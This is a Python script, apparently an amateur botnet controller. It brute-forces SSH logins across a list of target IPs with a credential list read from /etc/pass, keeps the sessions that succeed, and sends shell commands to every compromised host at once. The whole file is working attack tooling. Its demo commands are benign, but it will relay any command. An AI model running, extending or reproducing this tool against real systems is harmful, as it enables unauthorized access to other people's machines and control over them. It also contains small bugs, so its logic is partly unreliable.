#!/usr/bin/python
import pxssh
from pexpect import *
import pexpect
import PySweeper
import sys
import time
import signal
from time import sleep
import threading

class Command:
    def __init__(self, command, output):
        self.command = command
        self.output = output

class Client:
    def __init__(self, host, user, password):
        self.commands = []
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            print_color("[+] Connection successful!", "green")
            return s
        except Exception, e:
            return None
            print_color("[-] Connection timed out.", "red")

    def store_command_data(self, command, output):
        self.commands.append(Command(command, output))


class Botnet:
    def __init__(self):
        self.clients = []
        with open('/etc/ips') as f:
            self.ips = [x.strip() for x in f.readlines()]
        with open('/etc/pass') as f:
            self.credentials = [x.strip().split(':') for x in f.readlines()]

    def add_client(self, client):
        self.clients.append(client)

    def login(self, ip):
        for user, password in self.credentials:
            try:
                client = Client(ip, user, password)
            except:
                client = None
            finally:
                if client.session is not None:
                    self.add_client(client)

    def connect(self):
        threads = []
        for ip in self.ips:
            t = threading.Thread(target=self.login, args=(ip,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

    def send_command(self, command):
        for client in self.clients:
            client.session.sendline(command)
            client.session.prompt()
            split_output = client.session.before.split("\n")
            del split_output[0]
            output = ""
            for line in split_output:
                output += line + "\n"
            client.store_command_data(command, output)

    def print_output(self):
        for client in self.clients:
            print "\n" + client.host
            for command in client.commands:
                print "\n" + command.command
                print "\n" + command.output


def print_color(text, color):
    if color is "green":
        print("\033[92m" + text + "\033[0m")
    elif color is "red":
        print("\033[91m" + text + "\033[0m")
    elif color is "yellow":
        print("\033[93m" + text + "\033[0m")
    else:
        print(text + "\nColor not found!")

# def login(botnet):
#     for botnet.user, botnet.passwd in botnet.credentials:
#         try:
#             client = Client(ip, user, passwd)
#         except:
#             client = None
#         finally:
#             if client is not None:
#                 botnet.add_client(client)
#                 break

def main():
    botnet = Botnet()

    botnet.connect()
    botnet.send_command("ls -la")
    botnet.send_command("ls")
    botnet.print_output()

if __name__ == "__main__":
    main()
